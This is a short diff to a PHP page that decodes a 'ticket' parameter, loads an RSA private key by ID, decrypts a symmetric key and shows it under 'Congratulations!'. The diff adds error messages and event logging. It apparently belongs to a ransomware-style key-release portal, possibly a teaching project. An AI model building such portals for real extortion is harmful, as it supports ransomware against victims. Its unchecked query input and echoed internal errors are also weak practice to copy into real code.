@@ -7,9 +7,11 @@
 <body>
 	<div class="midcenter">
 	<?php
+		$errors = "";
 		//Load modules
 		include_once("mods/keypair.php");
 		include_once("mods/session.php");
+		include_once("mods/eventlog.php");
 		
 		//Start session
 		session_start();
@@ -21,9 +23,12 @@
 			//Get RSA key identity
 			$keyid=hex2bin(substr($_GET["ticket"],0,4));
 			$keyid=ord($keyid[0])*256+ord($keyid[1]);
-			
+
 			//Prepare key
 			$rsakey=(new KeyPair($can_decrypt=true))->sqlImport($link, $keyid);
+			if($rsakey->getPublic()==null)
+				$errors.="No matching RSA key by ID<br>\n";
+			
 			
 			//Get symmetric key
 			$bin_enc_key=hex2bin(substr($_GET["ticket"],4));
@@ -35,12 +40,15 @@
 				//Offer congratulatory note
 				echo("<h1>Congratulations!</h1>");	
 				echo("<strong>Decryption Key:</strong><br>".$symkey);
+				EventLog::addEntry($link, EventLog::CLIENTHOST_EVENT, "Decrypted key");
 			}else{
 				
 				//An error occured
-				echo("<h1>Oh no!</h1>\nSomething went wrong! We weren't able to decrypt your key.");
+				echo("<h1>Oh no!</h1>\nSomething went wrong! We weren't able to decrypt your key.<br><br>");
+				echo($errors);
 				unset($_SESSION);
 				session_destroy();
+				EventLog::addEntry($link, EventLog::CLIENTHOST_EVENT, "Decrypted key(failed)");
 			}
 		}else{
 			
